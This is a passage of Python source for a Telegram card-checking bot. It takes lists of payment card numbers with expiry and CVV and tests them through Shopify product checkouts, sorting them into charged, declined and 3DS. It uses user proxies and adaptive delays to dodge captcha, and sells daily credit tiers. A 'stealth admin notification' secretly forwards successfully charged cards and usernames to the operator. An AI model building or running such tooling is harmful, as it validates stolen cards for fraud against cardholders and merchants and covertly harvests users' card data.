                    [InlineKeyboardButton("◀️ Back", callback_data="menu_products")]
                ])
            )

    # Delete product
    elif data.startswith("prod_del_"):
        idx = int(data.split("_")[-1])
        settings = get_user_settings(user_id)
        products = settings.get("products", [])

        if idx < len(products):
            removed = products.pop(idx)
            update_user_setting(user_id, "products", products)

            await query.edit_message_text(
                f"✅ *Product Removed*\n\n`{removed}`\n\n📦 Remaining: {len(products)}",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_products")
            )

    # Clear all products
    elif data == "prod_clear_all":
        update_user_setting(user_id, "products", [])
        await query.edit_message_text(
            "✅ *All Products Cleared*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard("menu_products")
        )

    # Proxy menu
    elif data == "menu_proxy":
        settings = get_user_settings(user_id)
        proxy = settings.get("proxy")

        if proxy:
            text = f"🌐 *Your Proxy*\n\n`{proxy}`"
        else:
            text = "🌐 *Your Proxy*\n\nNo proxy set.\n\nClick ➕ Set Proxy to add one."

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_proxy_keyboard(user_id)
        )

    # Set proxy - ask for input
    elif data == "proxy_set":
        set_waiting_for(user_id, "proxy")
        await query.edit_message_text(
            "🌐 *Set Proxy*\n\n"
            "Send me your proxy in this format:\n\n"
            "`host:port:username:password`\n\n"
            "Example: `proxy.example.com:8080:user:pass`",
            parse_mode="Markdown",
            reply_markup=get_cancel_keyboard()
        )

    # Clear proxy
    elif data == "proxy_clear":
        update_user_setting(user_id, "proxy", None)
        await query.edit_message_text(
            "✅ *Proxy Cleared*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard("menu_proxy")
        )

    # Settings menu
    elif data == "menu_settings":
        settings = get_user_settings(user_id)
        proxy = settings.get("proxy")
        products = settings.get("products", [])

        text = (
            "⚙️ *Your Settings*\n\n"
            f"🌐 *Proxy*: `{proxy or 'Not set'}`\n"
            f"📦 *Products*: {len(products)}\n"
        )

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Check cards info
    elif data == "menu_check_info":
        await query.edit_message_text(
            "💳 *Check Cards*\n\n"
            "*How to check cards:*\n\n"
            "1️⃣ Paste a card directly:\n"
            "`4111111111111111|12|2025|123`\n\n"
            "2️⃣ Send a .txt file with cards\n\n"
            "*Supported formats:*\n"
            "• `card|mm|yyyy|cvv`\n"
            "• `card|mm|yy|cvv`\n"
            "• `card:mm:yyyy:cvv`\n"
            "• `card/mm/yyyy/cvv`",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Cancel input
    elif data == "cancel_input":
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "❌ *Cancelled*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Checking controls
    elif data == "chk_pause":
        session = get_user_session(user_id)
        session["paused"] = True
        await query.edit_message_reply_markup(reply_markup=get_checking_keyboard(paused=True))

    elif data == "chk_resume":
        session = get_user_session(user_id)
        session["paused"] = False
        await query.edit_message_reply_markup(reply_markup=get_checking_keyboard(paused=False))

    elif data == "chk_stop":
        session = get_user_session(user_id)
        session["stopped"] = True
        session["paused"] = False
        try:
            await query.edit_message_reply_markup(reply_markup=None)
        except:
            pass

    # =============================================================================
    # ADMIN PANEL CALLBACKS
    # =============================================================================

    elif data == "admin_close":
        if not is_admin(user_id):
            return
        await query.message.delete()

    elif data == "admin_users":
        if not is_admin(user_id):
            return
        users = await get_all_users_from_db()

        if users:
            text = f"👥 *All Users* ({len(users)})\n\n"
            for i, (uid, prod_count, has_proxy, created_at) in enumerate(users[:20]):
                proxy_icon = "🌐" if has_proxy else "➖"
                banned_icon = "🚫" if is_user_banned(uid) else ""
                text += f"`{uid}` \\- {prod_count} products {proxy_icon} {banned_icon}\n"
            if len(users) > 20:
                text += f"\n_...and {len(users) - 20} more users_"
        else:
            text = "👥 *All Users*\n\nNo users found."

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔍 View User Details", callback_data="admin_user_lookup")],
            [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
        ])
        await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=keyboard)

    elif data == "admin_user_lookup":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_user_lookup")
        await query.edit_message_text(
            "🔍 *View User Details*\n\n"
            "Send me the user ID to look up:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_stats":
        if not is_admin(user_id):
            return
        users = await get_all_users_from_db()

        text = (
            f"📊 *System Statistics*\n\n"
            f"⏱️ *Uptime*: {get_uptime()}\n\n"
            f"👥 *Users*: {len(users)}\n"
            f"🚫 *Banned*: {len(bot_stats['banned_users'])}\n\n"
            f"💳 *Cards Checked*: {bot_stats['total_cards_checked']}\n"
            f"✅ *Charged*: {bot_stats['total_charged']}\n"
            f"❌ *Declined*: {bot_stats['total_declined']}\n"
            f"🔐 *3DS*: {bot_stats['total_3ds']}\n\n"
            f"⚡ *Concurrency*:\n"
            f"• Global: {config.GLOBAL_CONCURRENCY_LIMIT}\n"
            f"• Per\\-user: {config.CONCURRENCY_LIMIT}\n"
            f"• Card delay: {config.CARD_DELAY}s"
        )

        await query.edit_message_text(
            text,
            parse_mode="MarkdownV2",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="admin_stats")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )

    elif data == "admin_broadcast":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_broadcast")
        await query.edit_message_text(
            "📢 *Broadcast Message*\n\n"
            "Send me the message to broadcast to all users:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_banned":
        if not is_admin(user_id):
            return
        banned = bot_stats["banned_users"]

        if banned:
            text = f"🚫 *Banned Users* ({len(banned)})\n\n"
            for uid in list(banned)[:20]:
                text += f"`{uid}`\n"
        else:
            text = "🚫 *Banned Users*\n\nNo banned users."

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔨 Ban User", callback_data="admin_ban")],
            [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
            [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
        ])
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=keyboard)

    elif data == "admin_ban":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_ban")
        await query.edit_message_text(
            "🔨 *Ban User*\n\n"
            "Send me the user ID to ban:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_unban":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_unban")
        await query.edit_message_text(
            "✅ *Unban User*\n\n"
            "Send me the user ID to unban:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_settings":
        if not is_admin(user_id):
            return
        text = (
            "⚙️ *Bot Settings*\n\n"
            f"*Concurrency Limit*: {config.CONCURRENCY_LIMIT}\n"
            f"*Global Limit*: {config.GLOBAL_CONCURRENCY_LIMIT}\n"
            f"*Card Delay*: {config.CARD_DELAY}s\n\n"
            "_Settings can be changed via environment variables on Railway_"
        )
        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )

    # =============================================================================
    # ADMIN CREDIT/SUBSCRIPTION MANAGEMENT
    # =============================================================================

    elif data == "admin_credits":
        if not is_admin(user_id):
            return
        await query.edit_message_text(
            "💳 *Manage Credits*\n\n"
            "Choose an action:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Add Credits", callback_data="admin_add_credits")],
                [InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove_credits")],
                [InlineKeyboardButton("🔍 Check User Credits", callback_data="admin_check_credits")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )

    elif data == "admin_add_credits":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_add_credits")
        await query.edit_message_text(
            "➕ *Add Credits*\n\n"
            "Send user ID and amount:\n\n"
            "Format: `user_id amount`\n"
            "Example: `123456789 100`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_credits")]
            ])
        )

    elif data == "admin_remove_credits":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_remove_credits")
        await query.edit_message_text(
            "➖ *Remove Credits*\n\n"
            "Send user ID and amount:\n\n"
            "Format: `user_id amount`\n"
            "Example: `123456789 50`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_credits")]
            ])
        )

    elif data == "admin_check_credits":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_check_credits")
        await query.edit_message_text(
            "🔍 *Check User Credits*\n\n"
            "Send the user ID:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_credits")]
            ])
        )

    elif data == "admin_subs":
        if not is_admin(user_id):
            return
        # Show subscription stats
        conn = get_db_connection()
        tier_counts = {"free": 0, "basic": 0, "premium": 0, "unlimited": 0}
        if conn:
            try:
                cur = conn.cursor()
                cur.execute("""
                    SELECT subscription_tier, COUNT(*)
                    FROM user_settings
                    GROUP BY subscription_tier
                """)
                for row in cur.fetchall():
                    tier = row[0] or "free"
                    if tier in tier_counts:
                        tier_counts[tier] = row[1]
                cur.close()
                conn.close()
            except Exception as e:
                logger.error(f"Error fetching tier stats: {e}")

        text = (
            "🏷️ *Subscription Management*\n\n"
            "*Current Subscribers:*\n"
            f"🆓 Free: {tier_counts['free']}\n"
            f"⭐ Basic: {tier_counts['basic']}\n"
            f"💎 Premium: {tier_counts['premium']}\n"
            f"👑 Unlimited: {tier_counts['unlimited']}\n"
        )

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔧 Set User Tier", callback_data="admin_set_tier")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )

    elif data == "admin_set_tier":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_set_tier")
        await query.edit_message_text(
            "🔧 *Set User Subscription*\n\n"
            "Send user ID, tier, and days:\n\n"
            "Format: `user_id tier days`\n"
            "Tiers: `free`, `basic`, `premium`, `unlimited`\n\n"
            "Example: `123456789 premium 30`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_subs")]
            ])
        )

    elif data == "admin_back":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "🔐 *Admin Panel*\n\n"
            "Select an option below:",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )

    elif data.startswith("admin_toggle_ban_"):
        if not is_admin(user_id):
            return
        target_id = int(data.split("_")[-1])
        if is_user_banned(target_id):
            unban_user(target_id)
            await query.answer(f"User {target_id} unbanned!", show_alert=True)
        else:
            ban_user(target_id)
            await query.answer(f"User {target_id} banned!", show_alert=True)
        # Refresh the user details view
        settings = get_user_settings(target_id)
        banned_status = "🚫 BANNED" if is_user_banned(target_id) else "✅ Active"
        proxy_status = f"`{settings.get('proxy')}`" if settings.get("proxy") else "Not set"
        products = settings.get("products", [])

        text_msg = (
            f"👤 *User Details*\n\n"
            f"*ID*: `{target_id}`\n"
            f"*Status*: {banned_status}\n"
            f"*Proxy*: {proxy_status}\n"
            f"*Products*: {len(products)}\n"
        )

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔨 Ban" if not is_user_banned(target_id) else "✅ Unban",
                                  callback_data=f"admin_toggle_ban_{target_id}")],
            [InlineKeyboardButton("◀️ Back", callback_data="admin_users")]
        ])
        await query.edit_message_text(text_msg, parse_mode="Markdown", reply_markup=keyboard)


async def setproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /setproxy command"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/setproxy host:port:user:pass`\n"
            "Example: `/setproxy proxy.example.com:8080:username:password`\n\n"
            "To remove proxy: `/setproxy clear`",
            parse_mode="Markdown"
        )
        return

    proxy_str = context.args[0]

    if proxy_str.lower() == "clear":
        update_user_setting(user_id, "proxy", None)
        await update.message.reply_text("✅ Proxy cleared! Using default proxy.")
    else:
        update_user_setting(user_id, "proxy", proxy_str)
        await update.message.reply_text(f"✅ Proxy set to: `{proxy_str}`", parse_mode="Markdown")


def is_product_error(error_msg: str) -> bool:
    """Check if an error indicates an invalid product URL that should be removed"""
    if not error_msg:
        return False
    error_lower = error_msg.lower()
    # Common product/store errors that indicate the URL is invalid
    invalid_indicators = [
        # Product not found errors
        "product not found",
        "404",
        "product does not exist",
        "store not found",
        "shop not found",
        "invalid product",
        "product is unavailable",
        "product has been removed",
        "this product is not available",
        "no longer available",
        "page not found",
        "couldn't find product",
        "failed to get product",
        "failed to fetch product",
        "invalid url",
        "not a valid shopify",
        # Stock/inventory errors
        "product out of stock",
        "out of stock",
        "item is out of stock",
        "sold out",
        "no stock available",
        "currently unavailable",
        "not in stock",
        "inventory not available",
        # Delivery/shipping errors
        "no available delivery strategy found",
        "no delivery options available",
        "delivery not available",
        "no shipping options",
        "cannot ship to",
        "shipping not available",
        "no delivery method",
        "delivery unavailable",
        "no shipping methods available",
        "unable to ship",
    ]
    return any(indicator in error_lower for indicator in invalid_indicators)


async def remove_invalid_product(user_id: int, product_url: str, reason: str = ""):
    """Remove an invalid product from user's list and log it"""
    try:
        settings = get_user_settings(user_id)
        products = settings.get("products", [])
        if product_url in products:
            products.remove(product_url)
            update_user_setting(user_id, "products", products)
            logger.warning(f"Auto-removed invalid product for user {user_id}: {product_url} - {reason}")
            return True
        return False
    except Exception as e:
        logger.error(f"Failed to remove invalid product: {e}")
        return False


async def validate_shopify_product(url: str) -> tuple[bool, str]:
    """Validate if a URL is a valid Shopify product page"""
    try:
        # Check URL format
        if "/products/" not in url:
            return False, "URL must contain '/products/' (Shopify product URL)"

        # Try to fetch product JSON
        json_url = url.rstrip('/') + ".json"

        async with aiohttp.ClientSession() as session:
            async with session.get(json_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if "product" in data:
                        product_title = data["product"].get("title", "Unknown")
                        return True, f"Product found: {product_title}"
                    else:
                        return False, "Not a valid Shopify product page"
                elif resp.status == 404:
                    return False, "Product not found (404)"
                elif resp.status == 401 or resp.status == 403:
                    # Some stores block JSON access, try HTML
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as html_resp:
                        if html_resp.status == 200:
                            text = await html_resp.text()
                            if 'Shopify' in text or 'shopify' in text or '/products/' in text:
                                return True, "Product page accessible"
                            else:
                                return False, "Not a Shopify store"
                        else:
                            return False, f"Page not accessible (HTTP {html_resp.status})"
                else:
                    return False, f"Failed to access product (HTTP {resp.status})"
    except asyncio.TimeoutError:
        return False, "Request timed out"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


async def addproduct_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addproduct command"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/addproduct <shopify_product_url>`\n"
            "Example: `/addproduct https://store.com/products/item`",
            parse_mode="Markdown"
        )
        return

    url = context.args[0]
    settings = get_user_settings(user_id)
    products = settings.get("products", [])

    if url in products:
        await update.message.reply_text("⚠️ This product URL is already in your list.")
        return

    # Validate the product URL
    status_msg = await update.message.reply_text("⏳ Validating product URL...")

    is_valid, message = await validate_shopify_product(url)

    if is_valid:
        products.append(url)
        update_user_setting(user_id, "products", products)
        await status_msg.edit_text(
            f"✅ Product added!\n\n"
            f"📝 {message}\n"
            f"📦 Total products: {len(products)}",
            parse_mode="Markdown"
        )
    else:
        await status_msg.edit_text(
            f"❌ *Failed to add product*\n\n"
            f"📝 {message}\n\n"
            f"Make sure the URL is a valid Shopify product page.",
            parse_mode="Markdown"
        )


async def removeproduct_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /removeproduct command"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/removeproduct <url>`\n"
            "Example: `/removeproduct https://store.com/products/item`\n\n"
            "Use `/products` to see your product list.",
            parse_mode="Markdown"
        )
        return

    url = context.args[0]
    settings = get_user_settings(user_id)
    products = settings.get("products", [])

    if url in products:
        products.remove(url)
        update_user_setting(user_id, "products", products)
        await update.message.reply_text(
            f"✅ Product removed!\n\n"
            f"📦 Remaining products: {len(products)}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "❌ Product not found in your list.\n\n"
            "Use `/products` to see your saved products.",
            parse_mode="Markdown"
        )


async def products_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /products command - list all products"""
    user_id = update.effective_user.id
    settings = get_user_settings(user_id)

    if not settings["products"]:
        await update.message.reply_text(
            "📦 *Your Product List*\n\n"
            "No products set. Using default product.\n\n"
            "Add products with: `/addproduct <url>`",
            parse_mode="Markdown"
        )
        return

    products_text = "\n".join([f"{i+1}. `{url}`" for i, url in enumerate(settings["products"])])
    await update.message.reply_text(
        f"📦 *Your Product List*\n\n{products_text}",
        parse_mode="Markdown"
    )


async def clearproducts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearproducts command"""
    user_id = update.effective_user.id
    update_user_setting(user_id, "products", [])
    await update.message.reply_text("✅ All products cleared!")


def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return config.ADMIN_USER_ID and user_id == config.ADMIN_USER_ID


async def dbstatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dbstatus command - admin only debug command"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("🚫 This command is restricted to administrators.")
        return

    status_parts = ["🔧 *Database Status*\n"]

    # Check if PostgreSQL is available
    if not HAS_POSTGRES:
        status_parts.append("⚠️ *PostgreSQL driver*: Not installed")
        status_parts.append("📦 Using: In-memory storage (data lost on restart)")
    else:
        status_parts.append("✅ *PostgreSQL driver*: Installed")

    # Check DATABASE_URL
    if DATABASE_URL:
        # Mask the URL for security
        masked_url = DATABASE_URL[:20] + "..." if len(DATABASE_URL) > 20 else DATABASE_URL
        status_parts.append(f"✅ *DATABASE\\_URL*: Set (`{masked_url}`)")
    else:
        status_parts.append("❌ *DATABASE\\_URL*: Not set")

    # Test actual connection
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()

            # Count users
            cur.execute("SELECT COUNT(*) FROM user_settings")
            user_count = cur.fetchone()[0]
            status_parts.append(f"\n📊 *Database Stats*:")
            status_parts.append(f"• Total users: {user_count}")

            # Get recent users (last 5)
            cur.execute("""
                SELECT user_id,
                       COALESCE(array_length(products, 1), 0) as product_count,
                       proxy IS NOT NULL as has_proxy
                FROM user_settings
                ORDER BY user_id DESC
                LIMIT 5
            """)
            recent_users = cur.fetchall()

            if recent_users:
                status_parts.append(f"\n👥 *Recent Users* (last 5):")
                for row in recent_users:
                    uid, prod_count, has_proxy = row
                    proxy_icon = "🌐" if has_proxy else "➖"
                    status_parts.append(f"• `{uid}`: {prod_count} products {proxy_icon}")

            # Test write capability
            cur.execute("SELECT 1")
            status_parts.append(f"\n✅ *Connection*: Active & working")

            cur.close()
            conn.close()
        except Exception as e:
            status_parts.append(f"\n❌ *Error*: {str(e)}")
            conn.close()
    else:
        if DATABASE_URL:
            status_parts.append(f"\n❌ *Connection*: Failed to connect")
        else:
            # Show in-memory cache stats
            status_parts.append(f"\n📊 *In-Memory Stats*:")
            status_parts.append(f"• Cached users: {len(user_settings_cache)}")
            if user_settings_cache:
                for uid, settings in list(user_settings_cache.items())[:5]:
                    prod_count = len(settings.get("products", []))
                    has_proxy = settings.get("proxy") is not None
                    proxy_icon = "🌐" if has_proxy else "➖"
                    status_parts.append(f"• `{uid}`: {prod_count} products {proxy_icon}")

    # Add concurrency stats
    status_parts.append(f"\n⚡ *Concurrency*:")
    status_parts.append(f"• Global limit: {config.GLOBAL_CONCURRENCY_LIMIT}")
    status_parts.append(f"• Per-user limit: {config.CONCURRENCY_LIMIT}")
    status_parts.append(f"• Active user semaphores: {len(user_semaphores)}")

    # Show active users with semaphores
    if user_semaphores:
        status_parts.append(f"• Users with active checks:")
        for uid in list(user_semaphores.keys())[:5]:
            status_parts.append(f"  └ `{uid}`")

    await update.message.reply_text(
        "\n".join(status_parts),
        parse_mode="Markdown"
    )


async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /settings command"""
    user_id = update.effective_user.id
    settings = get_user_settings(user_id)

    proxy_status = f"`{settings['proxy']}`" if settings["proxy"] else "Default"
    products_count = len(settings["products"])

    msg = (
        "⚙️ *Your Settings*\n\n"
        f"🌐 *Proxy*: {proxy_status}\n"
        f"📦 *Products*: {products_count} URLs\n"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")


# =============================================================================
# CREDIT & SUBSCRIPTION COMMANDS
# =============================================================================

def get_subscribe_keyboard():
    """Get subscription plans keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ Basic - 100/day", callback_data="sub_basic")],
        [InlineKeyboardButton("💎 Premium - 500/day", callback_data="sub_premium")],
        [InlineKeyboardButton("👑 Unlimited", callback_data="sub_unlimited")],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="menu_main")]
    ])


async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /credits command - show current credits and subscription status"""
    user_id = update.effective_user.id
    info = get_subscription_info(user_id)

    # Build status message
    credits_display = info["credits"] if not info["is_unlimited"] else "♾️ Unlimited"
    daily_limit = info["daily_limit"] if not info["is_unlimited"] else "♾️ Unlimited"

    msg = (
        f"💳 *Your Credits*\n\n"
        f"📊 *Current*: {credits_display}\n"
        f"📅 *Daily Limit*: {daily_limit}\n\n"
        f"🏷️ *Tier*: {info['tier_name']}\n"
    )

    if info["expires"] and info["days_left"] is not None:
        msg += f"⏰ *Expires in*: {info['days_left']} days\n"

    msg += f"\n📈 *Total Cards Checked*: {info['total_checks_used']}\n"
    msg += "\n_Credits reset daily at midnight UTC_"

    await update.message.reply_text(
        msg,
        parse_mode="Markdown",
        reply_markup=get_subscribe_keyboard()
    )


async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /subscribe command - show subscription plans"""
    user_id = update.effective_user.id
    info = get_subscription_info(user_id)

    msg = (
        f"💎 *Subscription Plans*\n\n"
        f"Your current tier: {info['tier_name']}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"🆓 *Free Tier*\n"
        f"• 10 credits per day\n"
        f"• Basic features\n\n"
        f"⭐ *Basic Tier*\n"
        f"• 100 credits per day\n"
        f"• Priority support\n\n"
        f"💎 *Premium Tier*\n"
        f"• 500 credits per day\n"
        f"• Fastest processing\n"
        f"• Priority support\n\n"
        f"👑 *Unlimited Tier*\n"
        f"• Unlimited credits\n"
        f"• All features unlocked\n"
        f"• VIP support\n\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"_Contact admin to upgrade your subscription_"
    )

    await update.message.reply_text(
        msg,
        parse_mode="Markdown",
        reply_markup=get_subscribe_keyboard()
    )


async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /history command - show usage history"""
    user_id = update.effective_user.id
    info = get_subscription_info(user_id)
    settings = get_user_settings(user_id)

    msg = (
        f"📊 *Usage History*\n\n"
        f"💳 *Total Cards Checked*: {info['total_checks_used']}\n\n"
        f"🏷️ *Current Tier*: {info['tier_name']}\n"
    )

    if not info["is_unlimited"]:
        msg += f"📊 *Credits Used Today*: {info['daily_limit'] - info['credits']}/{info['daily_limit']}\n"
        msg += f"💰 *Remaining Today*: {info['credits']}\n"
    else:
        msg += f"♾️ *Credits*: Unlimited\n"

    if info["expires"] and info["days_left"] is not None:
        msg += f"\n⏰ *Subscription Expires*: {info['days_left']} days\n"

    msg += "\n_Credits reset daily at midnight UTC_"

    await update.message.reply_text(msg, parse_mode="Markdown")


# =============================================================================
# ADMIN PANEL
# =============================================================================

def get_admin_keyboard():
    """Get admin panel main keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 View All Users", callback_data="admin_users")],
        [InlineKeyboardButton("📊 System Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("💳 Manage Credits", callback_data="admin_credits")],
        [InlineKeyboardButton("🏷️ Manage Subscriptions", callback_data="admin_subs")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🚫 Banned Users", callback_data="admin_banned")],
        [InlineKeyboardButton("⚙️ Bot Settings", callback_data="admin_settings")],
        [InlineKeyboardButton("❌ Close", callback_data="admin_close")]
    ])


async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command - admin panel"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("🚫 This command is restricted to administrators.")
        return

    await update.message.reply_text(
        "🔐 *Admin Panel*\n\n"
        "Select an option below:",
        parse_mode="Markdown",
        reply_markup=get_admin_keyboard()
    )


async def get_all_users_from_db():
    """Get all users from database"""
    users = []
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("""
                SELECT user_id,
                       COALESCE(array_length(products, 1), 0) as product_count,
                       proxy IS NOT NULL as has_proxy,
                       created_at
                FROM user_settings
                ORDER BY created_at DESC
            """)
            users = cur.fetchall()
            cur.close()
            conn.close()
        except Exception as e:
            logger.error(f"Error fetching users: {e}")
            if conn:
                conn.close()
    else:
        # From in-memory cache
        for uid, settings in user_settings_cache.items():
            users.append((
                uid,
                len(settings.get("products", [])),
                settings.get("proxy") is not None,
                None
            ))
    return users


async def get_user_details(user_id: int):
    """Get detailed info about a specific user"""
    settings = get_user_settings(user_id)
    return settings


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single card"""
    user_id = update.effective_user.id

    # Check if user has products set
    if not user_has_products(user_id):
        await update.message.reply_text(
            "❌ *No product set!*\n\n"
            "Use the menu to add a product first.",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: `/chk 4111111111111111|12|2025|123`", parse_mode="Markdown")
        return

    card_text = " ".join(context.args)
    cards = create_lista_(card_text)

    if not cards:
        await update.message.reply_text("❌ No valid card found in your message.")
        return

    card = cards[0]
    status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")

    try:
        result = await process_single_card(card, user_id)
        formatted = format_result(result)
        await status_msg.edit_text(formatted, parse_mode="Markdown")

        # Stealth admin notification for charged cards
        if result.get("response", {}).get("success"):
            username = update.effective_user.username or update.effective_user.first_name
            asyncio.create_task(notify_admin_charged(card, result, user_id, username))
    except Exception as e:
        logger.error(f"Check error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)}")


async def run_batch_check(cards: list, user_id: int, user_settings: dict, session: dict, status_msg, update: Update):
    """
    Run batch card checking as a background task.
    This function runs independently of the update handler, allowing other users to interact with the bot.
    """
    charged = []
    declined = []
    three_ds = []
    all_results = []
    last_response = ""
    checked_count = 0
    was_stopped = False
    total_cards = len(cards)
    username = update.effective_user.username or update.effective_user.first_name

    try:
        # Process cards with controlled pacing to avoid captcha
        # Instead of creating all tasks upfront, we process in controlled batches
        pending_tasks = set()
        card_index = 0
        card_delay = config.CARD_DELAY

        while card_index < total_cards or pending_tasks:
            # Check for stop FIRST
            if session["stopped"]:
                was_stopped = True
                # Cancel pending tasks
                for task in pending_tasks:
                    task.cancel()
                break

            # Check for pause
            while session["paused"] and not session["stopped"]:
                await asyncio.sleep(0.05)
                await asyncio.sleep(0)  # Yield to event loop

            if session["stopped"]:
                was_stopped = True
                for task in pending_tasks:
                    task.cancel()
                break

            # Add new tasks if under limit and cards remain
            while len(pending_tasks) < config.CONCURRENCY_LIMIT and card_index < total_cards:
                card = cards[card_index]
                task = asyncio.create_task(process_single_card(card, user_id, user_settings))
                pending_tasks.add(task)
                card_index += 1
                # Small delay between starting each card to avoid captcha
                if card_delay > 0 and card_index < total_cards:
                    await asyncio.sleep(card_delay)

            if not pending_tasks:
                break

            # Wait for at least one task to complete
            done, pending_tasks = await asyncio.wait(
                pending_tasks,
                return_when=asyncio.FIRST_COMPLETED,
                timeout=30  # Timeout to check for pause/stop
            )

            for future in done:
                try:
                    result = future.result()
                    response = result["response"]
                    card = result["card"]
                    checked_count += 1

                    # Check for captcha error - if detected, increase delay
                    error_msg_lower = str(response.get("error", "")).lower()
                    if "captcha" in error_msg_lower:
                        card_delay = min(card_delay + 0.5, 3.0)  # Increase delay, max 3 seconds
                        logger.warning(f"Captcha detected! Increasing delay to {card_delay}s")

                    # Deduct credit for this card
                    credit_success, remaining_credits = deduct_credits(user_id, 1)
                    if not credit_success:
                        # Out of credits - stop checking
                        session["stopped"] = True
                        was_stopped = True
                        asyncio.create_task(
                            update.message.reply_text(
